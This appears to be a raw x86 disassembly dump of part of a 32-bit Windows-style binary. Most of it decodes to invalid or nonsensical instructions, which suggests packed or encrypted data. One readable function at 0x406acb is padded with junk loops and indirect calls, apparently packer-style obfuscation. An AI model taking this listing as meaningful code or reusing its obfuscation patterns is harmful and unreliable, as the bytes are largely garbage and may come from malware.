  40692f:	jnp    0x40694e
  406931:	mov    ebx,0x1fb5a022
  406936:	stc    
  406937:	(bad)  
  406938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406939:	fs aas 
  40693b:	mov    cl,0xc6
  40693d:	imul   edi,DWORD PTR [edx-0x57b393f],0xfffffff9
  406944:	ja     0x4068eb
  406946:	jbe    0x40690a
  406948:	mov    bl,bl
  40694a:	fstp   DWORD PTR [ebp+0x60e11efc]
  406950:	sbb    al,0x8b
  406952:	jnp    0x4069d0
  406954:	push   ds
  406955:	dec    esi
  406956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406957:	nop
  406958:	push   cs
  406959:	and    DWORD PTR [edx-0x6],esi
  40695c:	cld    
  40695d:	add    DWORD PTR [ebx+edx*8-0x68],edx
  406961:	rcl    BYTE PTR [eax+0x2a],cl
  406964:	push   edi
  406965:	and    ebx,ebp
  406967:	les    esp,FWORD PTR [ecx+ebx*8]
  40696a:	jecxz  0x4069a1
  40696c:	jl     0x406937
  40696e:	jg     0x406912
  406970:	mov    BYTE PTR [edx],bh
  406972:	pop    ebp
  406973:	inc    eax
  406974:	ja     0x4069a7
  406976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406977:	test   eax,0xe5a85ec
  40697c:	leave  
  40697d:	cmp    ecx,0x88a90cbe
  406983:	repnz sub al,bl
  406986:	shr    DWORD PTR [ecx+0x7e],1
  406989:	shr    BYTE PTR [edi-0x77409844],cl
  40698f:	mov    dl,dh
  406991:	mov    bh,0x21
  406993:	jne    0x406971
  406995:	sar    DWORD PTR [eax+0x27ad0fe7],0xbd
  40699c:	int    0x63
  40699e:	loopne 0x406a03
  4069a0:	cmp    BYTE PTR [edi-0x70],0xa8
  4069a4:	cmp    BYTE PTR [ebx+0x15],ch
  4069a7:	cwde   
  4069a8:	aaa    
  4069a9:	out    0x18,eax
  4069ab:	aam    0xa2
  4069ad:	or     esp,eax
  4069af:	cmp    dl,ah
  4069b1:	fimul  WORD PTR [ebx]
  4069b3:	dec    edx
  4069b4:	cmp    eax,0x718965fb
  4069b9:	lds    ecx,FWORD PTR [edi+0x25]
  4069bc:	mov    bl,0x6f
  4069be:	and    bh,BYTE PTR [edi]
  4069c0:	and    edx,ecx
  4069c2:	push   ecx
  4069c3:	inc    ebp
  4069c4:	push   edi
  4069c5:	dec    eax
  4069c6:	mov    dh,BYTE PTR ds:0x92da65b5
  4069cc:	add    ch,BYTE PTR [ebx-0x1d]
  4069cf:	pop    esi
  4069d0:	adc    cl,BYTE PTR [esp+edx*4-0x78]
  4069d4:	les    edi,FWORD PTR [ebx]
  4069d6:	xchg   ebx,eax
  4069d7:	icebp  
  4069d8:	aad    0x48
  4069da:	lea    ebx,ds:0x7a5bd198
  4069e0:	cdq    
  4069e1:	inc    edi
  4069e2:	inc    ebp
  4069e3:	add    dl,BYTE PTR [ecx]
  4069e5:	fild   WORD PTR [eax-0x67cae1b1]
  4069eb:	push   edi
  4069ec:	sbb    DWORD PTR [esi+0x11],esp
  4069ef:	xor    BYTE PTR [ebx],0xe5
  4069f2:	sub    DWORD PTR [ebx],edi
  4069f4:	stos   BYTE PTR es:[edi],al
  4069f5:	jbe    0x406a50
  4069f7:	mov    ds:0x98b1030c,eax
  4069fc:	or     eax,DWORD PTR [ebp+0x685b2e02]
  406a02:	fnstsw WORD PTR [edi-0x5159b6e2]
  406a08:	jmp    0x1d02:0x3618c38f
  406a0f:	xchg   edi,eax
  406a10:	jg     0x4069c4
  406a12:	fnop   
  406a14:	inc    ebx
  406a15:	jbe    0x4069ed
  406a17:	push   edi
  406a18:	lahf   
  406a19:	test   DWORD PTR [ebx-0x7b],edi
  406a1c:	ret    0x2a90
  406a1f:	push   0xc71140a0
  406a24:	sub    eax,0xc1a2eae0
  406a29:	xor    eax,0xcc106b65
  406a2e:	mov    WORD PTR [edi+edx*4+0x17daafb4],cs
  406a35:	jmp    0x56d04fb9
  406a3a:	pop    esp
  406a3b:	adc    DWORD PTR [edx+0x3b],edi
  406a3e:	sbb    BYTE PTR ds:0xcba60f96,cl
  406a44:	sub    ebp,esi
  406a46:	push   ds
  406a47:	test   DWORD PTR [eax],edx
  406a49:	or     eax,0xd3c6d11e
  406a4e:	mov    fs,WORD PTR [ebx]
  406a50:	mov    ds:0xde0b2e8f,al
  406a55:	jmp    0xa695d30f
  406a5a:	cmp    BYTE PTR [esi],dl
  406a5c:	and    al,0xe2
  406a5e:	xchg   ebx,eax
  406a5f:	adc    DWORD PTR [edi-0x20325d78],edi
  406a65:	pop    ebx
  406a66:	loop   0x4069e8
  406a68:	lahf   
  406a69:	dec    ebx
  406a6a:	mov    bl,0xca
  406a6c:	pop    ebp
  406a6d:	mov    bh,0x7a
  406a6f:	ss dec esp
  406a71:	add    bh,BYTE PTR [ecx-0xb]
  406a74:	xchg   esp,eax
  406a75:	aas    
  406a76:	daa    
  406a77:	push   ds
  406a78:	into   
  406a79:	sbb    BYTE PTR [edx],bh
  406a7b:	out    0x94,al
  406a7d:	out    dx,al
  406a7e:	les    edx,FWORD PTR [edi]
  406a80:	test   al,0x5d
  406a82:	popf   
  406a83:	ins    DWORD PTR es:[edi],dx
  406a84:	mov    al,ds:0x6061ee1f
  406a89:	(bad)  
  406a8a:	lock mov eax,0x214ccd25
  406a90:	xchg   esi,eax
  406a91:	wrmsr  
  406a93:	sar    ebp,1
  406a95:	or     eax,0x6c5176b
  406a9a:	aas    
  406a9b:	sub    cl,BYTE PTR [eax+0x31]
  406a9e:	or     eax,0x473e9eac
  406aa3:	pushf  
  406aa4:	cmp    eax,0x8cf580b0
  406aa9:	or     BYTE PTR [ecx+0x13],cl
  406aac:	sbb    ebx,DWORD PTR [edi]
  406aae:	jb     0x406b0d
  406ab0:	neg    BYTE PTR [ebx]
  406ab2:	enter  0x3a4d,0x9d
  406ab6:	push   ecx
  406ab7:	lahf   
  406ab8:	xchg   BYTE PTR [ecx*8-0x113c1d8d],bl
  406abf:	inc    ebx
  406ac0:	xor    eax,ecx
  406ac2:	add    eax,0x32729c
  406ac7:	leave  
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x9c
  406c9b:	sbb    DWORD PTR [ebx],esi
  406c9d:	(bad)  
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c28
  406ca7:	out    dx,al
  406ca8:	js     0x406ca6
  406caa:	jb     0x406ce1
  406cac:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406cae:	test   BYTE PTR [edx-0x4b],dh
  406cb1:	xchg   ebp,eax
  406cb2:	inc    eax
  406cb3:	enter  0xccb4,0x3f
  406cb7:	mov    dl,0xe3
  406cb9:	dec    esp
  406cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cbb:	fmul   QWORD PTR [esi-0x6a]
  406cbe:	loope  0x406ced
  406cc0:	dec    ebp
  406cc1:	adc    bl,bh
  406cc3:	int    0x55
  406cc5:	add    al,0x43
  406cc7:	js     0x406cba
  406cc9:	jnp    0x406cd8
  406ccb:	and    DWORD PTR [esi+ebp*8+0x6d30b156],esp
  406cd2:	inc    esi
  406cd3:	(bad)  
  406cd4:	neg    DWORD PTR [esi+0x29490f74]
  406cda:	ss mov eax,0xedde31c7
  406ce0:	(bad)  
  406ce1:	cmc    
  406ce2:	in     eax,0xea
  406ce4:	aaa    
  406ce5:	sbb    edx,ebp
  406ce7:	push   ebx
  406ce8:	pop    eax
  406ce9:	arpl   WORD PTR [eax],ax
  406ceb:	sub    BYTE PTR [ecx],ah
  406ced:	ror    BYTE PTR [edx-0x39f386ea],1
  406cf3:	add    al,0x20
  406cf5:	mov    ds,WORD PTR [ebp-0x29]
  406cf8:	pop    ebp
  406cf9:	pop    edi
  406cfa:	xor    al,0xe8
  406cfc:	(bad)  
  406cfd:	jmp    0x2840:0xef25ad67
  406d04:	xchg   esp,eax
  406d05:	xor    eax,0x1400dcd0
  406d0a:	ins    BYTE PTR es:[edi],dx
  406d0b:	loopne 0x406cba
  406d0d:	adc    BYTE PTR [edx-0x232cb5f],cl
  406d13:	xor    DWORD PTR [ecx],esp
  406d15:	xchg   esp,eax
  406d16:	or     cl,BYTE PTR [ebx]
  406d18:	mov    eax,DWORD PTR [edx+edx*1+0x4c]
  406d1c:	mov    ds:0x9c2677b7,eax
  406d21:	dec    eax
  406d22:	pop    ecx
  406d23:	cmp    esi,DWORD PTR [ebp+ecx*4-0x11]
  406d27:	nop
  406d28:	mov    al,ds:0xea31a446
  406d2d:	pop    es
  406d2e:	or     al,0x5a
  406d30:	loope  0x406d00
  406d32:	mov    edi,DWORD PTR [eax-0x6d3924c3]
  406d38:	sbb    ebx,DWORD PTR [edi+0x38]
  406d3b:	loope  0x406cec
  406d3d:	inc    ebx
  406d3e:	mov    ch,0x8e
  406d40:	xlat   BYTE PTR ds:[ebx]
  406d41:	js     0x406d8f
  406d43:	call   0x4365:0xec48ff3d
  406d4a:	test   BYTE PTR [edx+0x28],cl
  406d4d:	das    
  406d4e:	mov    ch,0x62
  406d50:	lock test DWORD PTR [eax-0x75],ecx
  406d54:	cs adc eax,0xffffffae
  406d58:	and    DWORD PTR [ecx+0x6],ecx
  406d5b:	jge    0x406d79
  406d5d:	adc    bh,dl
  406d5f:	cmp    al,BYTE PTR [ecx]
  406d61:	dec    eax
  406d62:	lds    ebp,FWORD PTR [esi-0x31e3db41]
  406d68:	jge    0x406db4
  406d6a:	sbb    dh,BYTE PTR [edi]
  406d6c:	sbb    edx,0x8b12d3ad
  406d72:	mov    ebp,0x822be462
  406d77:	xchg   DWORD PTR [edi],ebx
  406d79:	jg     0x406df2
  406d7b:	sub    al,0xfa
  406d7d:	adc    BYTE PTR [ebx+0x63],bh
  406d80:	mov    esp,0xaf390dca
  406d85:	call   0x276ab74c
  406d8a:	out    dx,al
  406d8b:	add    DWORD PTR [edi-0x7b8f3d45],eax
  406d91:	ret    0x9088
  406d94:	lahf   
  406d95:	sahf   
  406d96:	adc    al,0x20
  406d98:	fwait
  406d99:	push   0xffffffff
  406d9b:	xor    DWORD PTR [esi],0xffffff93
  406d9e:	push   edx
  406d9f:	int3   
  406da0:	outs   dx,BYTE PTR ds:[esi]
  406da1:	xchg   ecx,eax
  406da2:	pop    eax
  406da3:	push   cs
  406da4:	nop    DWORD PTR [ebx]
  406da7:	xchg   edi,eax
  406da8:	lea    ebx,[eax]
  406daa:	popa   
  406dab:	(bad)  
  406dac:	popa   
  406dad:	and    al,0x9b
  406daf:	cdq    
  406db0:	xchg   ebp,eax
  406db1:	fbld   TBYTE PTR [ecx+eax*2]
  406db4:	test   eax,0xf16e70c5
  406db9:	xor    ecx,DWORD PTR [eax+ecx*8+0x8]
  406dbd:	(bad)  
  406dbe:	xor    BYTE PTR [ebx],0x8c
  406dc1:	cmp    ah,bh
  406dc3:	adc    DWORD PTR [esi-0x13],eax
  406dc6:	inc    ecx
  406dc7:	cs xor al,0x65
  406dca:	into   
  406dcb:	jo     0x406e08
  406dcd:	adc    DWORD PTR [ecx],eax
  406dcf:	scas   eax,DWORD PTR es:[edi]
  406dd0:	stos   BYTE PTR es:[edi],al
  406dd1:	mov    esp,0x17b7d34b
  406dd6:	shl    DWORD PTR [ecx+esi*8-0x22],0xbb
  406ddb:	mov    edx,0x19665519
  406de0:	mov    esp,0xa87b936f
  406de5:	inc    edi
  406de6:	test   eax,0x21ae0617
  406deb:	call   0xfc6ffb10
  406df0:	fs mov ebx,edi
  406df3:	ins    DWORD PTR es:[edi],dx
  406df4:	mov    bl,BYTE PTR [edx-0x50]
  406df7:	int3   
  406df8:	mov    dh,BYTE PTR [esi+0x10db1505]
  406dfe:	dec    BYTE PTR [edi+0x53a9268]
  406e04:	dec    edx
  406e05:	and    dh,0xe0
  406e08:	and    ebx,DWORD PTR [esi]
  406e0a:	gs das 
  406e0c:	xor    eax,0x5cad0757
  406e11:	push   edi
  406e12:	and    al,0xa4
  406e14:	sbb    al,0xed
  406e16:	xchg   ebp,eax
  406e17:	sbb    bl,cl
  406e19:	pushf  
  406e1a:	into   
  406e1b:	jp     0x406dab
  406e1d:	or     BYTE PTR [ecx+0x43c58ff],dh
  406e23:	and    eax,0xa53cc162
  406e28:	enter  0xf8f5,0x94
  406e2c:	jp     0x406e74
  406e2e:	add    ch,dh
  406e30:	push   edx
  406e31:	mov    fs,WORD PTR [ebp+0x4a2c993c]
  406e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e38:	imul   esp,DWORD PTR [edi+0x1e],0xc
  406e3c:	out    dx,eax
  406e3d:	sbb    eax,0x4b02c4c1
  406e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e43:	sbb    eax,0xc6b12658
  406e48:	push   edx
  406e49:	leave  
  406e4a:	pop    eax
  406e4b:	clc    
  406e4c:	fcom   DWORD PTR [ebp-0x272ad052]
  406e52:	jne    0x406e31
  406e54:	ja     0x406e7f
  406e56:	retf   
  406e57:	scas   eax,DWORD PTR es:[edi]
  406e58:	aaa    
  406e59:	in     al,0x4b
  406e5b:	ror    DWORD PTR [esi],cl
  406e5d:	sub    al,0x5d
  406e5f:	(bad)  
  406e60:	repz jmp 0x406e32
  406e63:	add    BYTE PTR [edx+0x6d],bl
  406e66:	lds    ebx,FWORD PTR [esi]
  406e68:	pop    edi
  406e69:	push   ebx
  406e6a:	mov    edx,0x95d560bb
  406e6f:	cmp    DWORD PTR [ebp-0x75],esi
  406e72:	dec    ecx
  406e73:	inc    ebp
  406e74:	add    BYTE PTR [ebx+0x33],bl
  406e77:	rol    BYTE PTR [esi+0x29],0xd
  406e7b:	cs stos DWORD PTR es:[edi],eax
  406e7d:	cmc    
  406e7e:	aam    0x9
  406e80:	or     ch,BYTE PTR [eax-0x70abb5b8]
  406e86:	cmp    eax,esi
  406e88:	cli    
  406e89:	push   0xffffffc1
  406e8b:	lock outs dx,DWORD PTR ds:[esi]
  406e8d:	mov    eax,0xdfa80d4d
  406e92:	aaa    
  406e93:	ret    0x8928
  406e96:	jb     0x406edf
  406e98:	std    
  406e99:	mov    BYTE PTR [edi-0x49],ah
  406e9c:	lahf   
  406e9d:	outs   dx,DWORD PTR ds:[esi]
  406e9e:	sti    
  406e9f:	fs jl  0x406e87
  406ea2:	add    al,0x6
  406ea4:	jne    0x406f0c
  406ea6:	(bad)  
  406ea8:	xor    DWORD PTR [ecx],0x47
  406eab:	push   es
  406eac:	and    esi,edx
  406eae:	mov    dh,BYTE PTR [esi]
  406eb0:	test   al,0xe
  406eb2:	jg     0x406eac
  406eb4:	outs   dx,DWORD PTR ds:[esi]
  406eb5:	pop    esi
  406eb6:	inc    esi
  406eb7:	add    eax,0x704e69f6
  406ebc:	loope  0x406e73
  406ebe:	xchg   ebx,eax
  406ebf:	push   edi
  406ec0:	xchg   ebx,ebx
  406ec2:	xor    BYTE PTR [ebx+0x7e],dl
  406ec5:	hlt    
  406ec6:	scas   eax,DWORD PTR es:[edi]
  406ec7:	xor    bh,cl
  406ec9:	adc    cl,BYTE PTR [eiz*2+0x7784b097]
  406ed0:	adc    BYTE PTR [ecx],cl
  406ed2:	cmp    BYTE PTR [ebx-0x6],ch
  406ed5:	pop    ds
  406ed6:	inc    eax
  406ed7:	in     eax,0xc3
  406ed9:	xor    BYTE PTR [eax],dh
  406edb:	in     al,dx
  406edc:	sbb    eax,0x9342977c
  406ee1:	mov    esi,0x56f21fc0
  406ee6:	cmp    DWORD PTR [edx-0x59],ebp
  406ee9:	xor    eax,0xfa0ae845
  406eee:	adc    al,0x9f
  406ef0:	dec    ecx
  406ef1:	push   0xfd8301f3
  406ef6:	aad    0x80
  406ef8:	jp     0x406ef8
  406efa:	(bad)  
  406efb:	arpl   cx,cx
  406efd:	mov    cl,0x21
  406eff:	retf   0x90ee
  406f02:	adc    bh,bh
  406f04:	(bad)  
  406f05:	out    dx,al
  406f06:	pop    esp
  406f07:	pop    edx
  406f08:	jl     0x406ed2
  406f0a:	ja     0x406f84
  406f0c:	dec    edi
  406f0d:	test   eax,0x5ffe706c
  406f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f13:	pushf  
  406f14:	dec    esp
  406f15:	repz rcr BYTE PTR ds:0xb260b5ce,0x76
  406f1d:	clc    
  406f1e:	push   ds
  406f1f:	mov    bh,0x66
  406f21:	(bad)  
  406f22:	in     eax,dx
  406f23:	fwait
  406f24:	pop    ebx
  406f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f26:	xlat   BYTE PTR ds:[ebx]
  406f27:	pop    esp
  406f28:	retf   
  406f29:	fstp   TBYTE PTR [edi]
  406f2b:	rcr    DWORD PTR [edx],cl
  406f2d:	pop    edx
  406f2e:	xor    esi,edx
  406f30:	iret   
  406f31:	push   0xf334499b
  406f36:	inc    eax
  406f37:	xchg   DWORD PTR [eax+eax*8+0x31],esi
  406f3b:	aad    0x47
  406f3d:	iret   
  406f3e:	lock loope 0x406fb9
  406f41:	leave  
  406f42:	jne    0x406f0f
  406f44:	or     al,0x56
  406f46:	gs jae 0x406f86
  406f49:	loop   0x406f40
  406f4b:	mov    al,0x9a
  406f4d:	dec    ebx
  406f4e:	call   0x7da0:0x3ea304f
  406f55:	call   0xf1fe:0x6644d8c3
  406f5c:	je     0x406f26
  406f5e:	xchg   ecx,eax
  406f5f:	imul   eax,ecx,0x76ae4260
  406f65:	push   edi
  406f66:	scas   al,BYTE PTR es:[edi]
  406f67:	dec    ebp
  406f68:	pop    ebx
  406f69:	xchg   ebp,eax
  406f6a:	imul   eax,DWORD PTR [edx+0x42],0x43f8a033
  406f71:	retf   
  406f72:	or     BYTE PTR [edi+ebx*1],dl
  406f75:	xor    eax,0xcfa9af89
  406f7a:	scas   eax,DWORD PTR es:[edi]
  406f7b:	jge    0x406f15
  406f7d:	push   ss
  406f7e:	cmp    dl,dh
  406f80:	ds hlt 
  406f82:	adc    ah,BYTE PTR [esi-0x71]
  406f85:	sbb    eax,esi
  406f87:	push   ebx
  406f88:	fild   DWORD PTR [esi+0x77]
  406f8b:	pop    edx
  406f8c:	(bad)  
  406f8d:	dec    eax
  406f8e:	xchg   BYTE PTR [edx+0x179bcf0a],dl
  406f94:	lahf   
  406f95:	push   eax
  406f96:	xchg   ebx,eax
  406f97:	cmp    eax,0x4ff76c62
  406f9c:	add    ebx,DWORD PTR [ebx-0x1cdbd569]
  406fa2:	adc    BYTE PTR [edi-0x4cd4a649],cl
  406fa8:	mov    al,0xb2
  406faa:	pusha  
  406fab:	and    eax,ebx
  406fad:	out    0x82,eax
  406faf:	ins    BYTE PTR es:[edi],dx
  406fb0:	jp     0x406fa4
  406fb2:	push   eax
  406fb3:	mov    dh,0x4f
  406fb5:	pop    edx
  406fb6:	add    cl,0x3e
  406fb9:	inc    eax
  406fba:	inc    eax
  406fbb:	push   esi
  406fbc:	hlt    
  406fbd:	rcl    DWORD PTR [ebx],1
  406fbf:	stos   BYTE PTR es:[edi],al
  406fc0:	pushf  
  406fc1:	xchg   edi,eax
  406fc2:	xor    al,0x8c
  406fc4:	imul   edi,DWORD PTR [edx-0x4e195b28],0xc2569270
  406fce:	or     al,0xe7
  406fd0:	jo     0x407034
  406fd2:	sbb    DWORD PTR [edi+0x45c7c053],edi
  406fd8:	int3   
  406fd9:	xor    DWORD PTR ds:0x1581f89f,eax
  406fdf:	jb     0x406fde
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	out    0x42,eax
  406fe6:	add    bh,al
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [eax-0x38f41e23],dx
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x407025
  407018:	mov    ss,WORD PTR [esi]
  40701a:	pop    ds
  40701b:	jnp    0x40701f
  40701d:	enter  0xcd62,0x84
  407021:	cmp    edi,DWORD PTR [ecx]
  407023:	dec    edi
  407024:	loopne 0x40707f
  407026:	push   cs
  407027:	xor    al,0x99
  407029:	dec    esp
  40702a:	xchg   DWORD PTR [eax-0x11b390d6],ecx
  407030:	(bad)  
  407031:	in     eax,0xab
  407033:	outs   dx,DWORD PTR ds:[esi]
  407034:	retf   0x168
  407037:	and    esp,esi
  407039:	xchg   ebx,eax
  40703a:	(bad)  
  40703b:	sar    dh,cl
  40703d:	daa    
  40703e:	cmp    al,0xdd
  407040:	scas   eax,DWORD PTR es:[edi]
  407041:	pop    ebx
  407042:	cmc    
  407043:	mov    eax,ds:0xc8c4550d
  407048:	mov    esp,0x754a9ceb
  40704d:	jp     0x407074
  40704f:	xchg   esp,esp
  407051:	push   0xe
  407053:	out    dx,al
  407054:	sub    eax,0x2b387f42
  407059:	jne    0x4070c6
  40705b:	dec    eax
  40705c:	jno    0x406ff2
  40705e:	add    ah,al
  407060:	hlt    
  407061:	xor    ch,BYTE PTR ds:0x6f4e597
  407067:	aaa    
  407068:	popa   
  407069:	aas    
  40706a:	je     0x407056
  40706c:	stc    
  40706d:	call   0xaefc:0x71326425
  407074:	or     esp,DWORD PTR ds:0x72860400
  40707a:	sbb    esp,DWORD PTR [ebp+0x15]
  40707d:	sbb    al,0xc
  40707f:	add    ebx,edx
  407081:	jae    0x40704f
  407083:	jbe    0x4070e5
  407085:	mov    edx,0xda1e18b6
  40708a:	sbb    BYTE PTR [ecx+0x46a0e15f],ch
  407090:	jns    0x407086
  407092:	repz imul esp,DWORD PTR [ebx-0xbd1f8fe],0x69
  40709a:	sub    BYTE PTR [esi+0x64],bh
  40709d:	ror    BYTE PTR [edx+0x27da26c2],1
  4070a3:	pop    ebp
  4070a4:	jmp    0xf513:0x2618cba9
  4070ab:	jp     0x4070ff
  4070ad:	aam    0x17
  4070af:	popa   
  4070b0:	lods   eax,DWORD PTR ds:[esi]
  4070b1:	jmp    0x36ec:0xa2ac1ccf
  4070b8:	out    0x0,al
  4070ba:	xor    edi,edi
  4070bc:	dec    ebx
  4070bd:	std    
  4070be:	xor    al,0xa0
  4070c0:	inc    ebp
  4070c1:	push   0xffffff9a
  4070c3:	mov    dl,0x21
  4070c5:	and    esi,DWORD PTR [ebx]
  4070c7:	mov    bh,0x8
  4070c9:	int3   
  4070ca:	cwde   
  4070cb:	adc    DWORD PTR [eax],0xffffffc4
  4070ce:	mov    esi,0xa4932c5
  4070d3:	dec    esi
  4070d4:	jmp    0x407062
  4070d6:	cmp    BYTE PTR ds:0x515fbeaa,0x3c
  4070dd:	iret   
  4070de:	loop   0x407073
  4070e0:	adc    DWORD PTR [esi],edi
  4070e2:	out    0xe4,eax
  4070e4:	sub    ah,BYTE PTR [ebx+ecx*2]
  4070e7:	inc    esi
  4070e8:	xchg   esp,eax
  4070e9:	mov    BYTE PTR [eax-0x78c82b84],ah
  4070ef:	push   edi
  4070f0:	in     eax,dx
  4070f1:	loope  0x407076
  4070f3:	icebp  
  4070f4:	fiadd  DWORD PTR [ecx-0x669daafa]
  4070fa:	lds    esi,FWORD PTR [eax+0x1c7c1a13]
  407100:	lock push ds
  407102:	inc    esp
  407103:	adc    BYTE PTR [esp+ecx*4],0xaf
  407107:	fwait
  407108:	into   
  407109:	pop    eax
  40710a:	stc    
  40710b:	mov    bl,0x26
  40710d:	mov    ds:0x652c58d9,eax
  407112:	cdq    
  407113:	push   esp
  407114:	fiadd  DWORD PTR [ebp-0x6cd826cd]
  40711a:	lea    eax,[edx]
  40711c:	xor    DWORD PTR [eax],eax
  40711e:	cmp    eax,0xb9087587
  407123:	push   esp
  407124:	dec    eax
  407125:	fwait
  407126:	inc    ebp
  407127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407128:	xor    bl,BYTE PTR [edx+0x17]
  40712b:	retf   
  40712c:	inc    eax
  40712d:	xor    bh,bl
  40712f:	ror    DWORD PTR ds:0xdd807171,0xee
  407136:	mov    ds:0x95cf90ce,al
  40713b:	mov    WORD PTR [ecx-0x1b1cd8fe],gs
  407141:	bnd jo 0x4071b2
  407144:	inc    esp
  407145:	sbb    bl,0xe4
  407148:	clc    
  407149:	sbb    al,0xc9
  40714b:	std    
  40714c:	xor    DWORD PTR [edi+0xf],ebp
  40714f:	push   ecx
  407150:	fidivr WORD PTR ds:0x62a0756e
  407156:	jle    0x4070ec
  407158:	add    dl,ah
  40715a:	xchg   ecx,eax
  40715b:	mov    DWORD PTR cs:[edi],esp
  40715e:	not    ebx
  407160:	fwait
  407161:	inc    edi
  407162:	cli    
  407163:	mov    edx,0xc107f582
  407168:	push   es
  407169:	push   0x3a610640
  40716e:	in     eax,0xae
  407170:	jae    0x4070fe
  407172:	ins    DWORD PTR es:[edi],dx
  407173:	jecxz  0x40712b
  407175:	pop    edx
  407176:	fcom   st(2)
  407178:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40717a:	loop   0x4071bc
  40717c:	sub    eax,0x97b34331
  407181:	xor    edi,DWORD PTR [eax+ecx*8+0xb]
  407185:	in     eax,0x12
  407187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407188:	aad    0xc0
